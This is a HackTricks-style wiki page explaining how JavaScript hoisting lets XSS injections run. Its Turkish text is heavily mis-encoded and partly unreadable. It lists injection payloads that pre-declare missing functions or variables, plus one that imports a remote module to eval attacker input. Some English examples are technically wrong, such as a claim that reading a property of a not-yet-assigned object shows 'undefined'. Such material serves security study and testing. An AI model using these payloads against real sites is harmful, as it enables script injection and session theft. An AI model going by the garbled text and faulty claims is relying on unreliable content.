# JS Hoisting

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan ileri seviyeye taÅŸÄ±yÄ±n</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile</strong>!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Temel Bilgiler

JavaScript dilinde, **Hoisting** olarak bilinen bir mekanizma, deÄŸiÅŸkenlerin, fonksiyonlarÄ±n, sÄ±nÄ±flarÄ±n veya importlarÄ±n bildirimlerinin, kodun Ã§alÄ±ÅŸtÄ±rÄ±lmadan Ã¶nce kapsamlarÄ±nÄ±n en Ã¼stÃ¼ne kavramsal olarak yÃ¼kseltildiÄŸi ÅŸekilde tanÄ±mlanÄ±r. Bu iÅŸlem, JavaScript motoru tarafÄ±ndan otomatik olarak gerÃ§ekleÅŸtirilir ve motor, betiÄŸi birden fazla geÃ§iÅŸte tarar.

Ä°lk geÃ§iÅŸ sÄ±rasÄ±nda, motor, sÃ¶zdizimi hatalarÄ±nÄ± kontrol etmek ve betiÄŸi soyut sÃ¶zdizim aÄŸacÄ±na dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in kodu ayrÄ±ÅŸtÄ±rÄ±r. Bu aÅŸama, hoisting'i iÃ§eren bir sÃ¼reÃ§ olan bildirimleri yÃ¼rÃ¼tme baÄŸlamÄ±nÄ±n en Ã¼stÃ¼ne taÅŸÄ±r. AyrÄ±ÅŸtÄ±rma aÅŸamasÄ±, sÃ¶zdizimi hatalarÄ± olmadÄ±ÄŸÄ±nÄ± gÃ¶steren baÅŸarÄ±lÄ± bir ÅŸekilde tamamlandÄ±ÄŸÄ±nda, betik yÃ¼rÃ¼tmesi devam eder.

ÅunlarÄ± anlamak Ã¶nemlidir:

1. Betik, yÃ¼rÃ¼tme iÃ§in sÃ¶zdizimi hatalarÄ±ndan arÄ±ndÄ±rÄ±lmÄ±ÅŸ olmalÄ±dÄ±r. SÃ¶zdizimi kurallarÄ±na kesinlikle uyulmalÄ±dÄ±r.
2. Kodun betik iÃ§indeki yerleÅŸimi, hoisting nedeniyle yÃ¼rÃ¼tme Ã¼zerinde etkili olur, ancak yÃ¼rÃ¼tÃ¼len kod, metinsel temsilinden farklÄ± olabilir.

#### Hoisting TÃ¼rleri

MDN'den alÄ±nan bilgilere gÃ¶re, JavaScript'te dÃ¶rt farklÄ± hoisting tÃ¼rÃ¼ bulunmaktadÄ±r:

1. **DeÄŸer Hoisting**: Bir deÄŸiÅŸkenin deÄŸerinin, bildirim satÄ±rÄ±ndan Ã¶nceki kapsamÄ±nda kullanÄ±lmasÄ±nÄ± saÄŸlar.
2. **Bildirim Hoisting**: Bir deÄŸiÅŸkenin bildiriminden Ã¶nceki kapsamÄ±nda baÅŸvurulmasÄ±na izin verir ve `ReferenceError` hatasÄ± oluÅŸturmadan, deÄŸiÅŸkenin deÄŸeri `undefined` olur.
3. Bu tÃ¼r, deÄŸiÅŸkenin gerÃ§ek bildirim satÄ±rÄ±ndan Ã¶nceki bildirimi nedeniyle kapsam iÃ§indeki davranÄ±ÅŸÄ± deÄŸiÅŸtirir.
4. Bildirimin yan etkileri, iÃ§eren kodun geri kalanÄ±nÄ±n deÄŸerlendirilmeden Ã¶nce gerÃ§ekleÅŸir.

AyrÄ±ntÄ±lÄ± olarak, fonksiyon bildirimleri 1. tÃ¼r hoisting davranÄ±ÅŸÄ±nÄ± sergiler. `var` anahtar kelimesi 2. tÃ¼r davranÄ±ÅŸÄ± gÃ¶sterir. `let`, `const` ve `class` iÃ§eren leksikal bildirimler 3. tÃ¼r davranÄ±ÅŸÄ± gÃ¶sterir. Son olarak, `import` ifadeleri, hem 1. tÃ¼r hem de 4. tÃ¼r davranÄ±ÅŸlarla hoisted olarak benzersizdir.


## Senaryolar

Bu nedenle, **tanÄ±mlanmamÄ±ÅŸ bir nesnenin kullanÄ±ldÄ±ktan sonra JS kodu enjekte edebileceÄŸiniz senaryolarda**, bunu **bildirerek** (bÃ¶ylece kodunuz hata fÄ±rlatmak yerine yÃ¼rÃ¼tÃ¼lÃ¼r):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesnÂ´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
## Daha Fazla Senaryo

In addition to the scenarios mentioned earlier, there are a few more scenarios where JavaScript hoisting can be exploited for XSS attacks. Let's take a look at them:

### 1. Function Declarations

When a function is declared using the `function` keyword, it is hoisted to the top of its scope. This means that even if the function is defined after it is called, it can still be executed without any errors. Attackers can take advantage of this behavior to execute malicious code.

```javascript
<script>
    foo(); // This will execute the function even though it is defined later
    function foo() {
        alert('XSS');
    }
</script>
```

### 2. Variable Declarations

Similarly, variable declarations using the `var` keyword are also hoisted to the top of their scope. This allows attackers to use variables before they are actually declared.

```javascript
<script>
    alert(x); // This will display 'undefined' as the variable is hoisted but not assigned a value yet
    var x = 'XSS';
</script>
```

### 3. Object Declarations

When an object is declared using the `var` keyword, the variable is hoisted but the object itself is not. However, the properties of the object can still be accessed before the object is declared.

```javascript
<script>
    alert(obj.property); // This will display 'undefined' as the object is not hoisted
    var obj = {
        property: 'XSS'
    };
</script>
```

### 4. Function Expressions

Unlike function declarations, function expressions are not hoisted. Therefore, if a function expression is used before it is defined, an error will occur.

```javascript
<script>
    foo(); // This will throw an error as the function expression is not hoisted
    var foo = function() {
        alert('XSS');
    };
</script>
```

By understanding these additional scenarios, you can further exploit JavaScript hoisting for XSS attacks. Remember to always validate and sanitize user input to prevent such vulnerabilities.
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if(config){
return;
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config;`-alert(1)`//`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
}
})
}
```
## Referanslar

* [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)
* [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
* [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
